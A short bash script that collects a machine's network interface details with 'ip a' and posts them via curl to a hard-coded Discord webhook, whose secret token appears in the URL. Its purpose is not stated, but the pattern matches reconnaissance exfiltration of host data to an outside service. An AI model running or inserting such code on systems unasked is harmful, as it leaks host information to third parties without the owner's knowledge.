#!/bin/bash

# Define the Discord webhook URL
WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"

# Get network data
NETWORK_DATA=$(ip a)

# Prepare the message payload
PAYLOAD=$(cat <<EOF
{
  "content": "Network Data:\n\`\`\`$NETWORK_DATA\`\`\`"
}
EOF
)

# Send the data to the Discord webhook
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$WEBHOOK_URL"
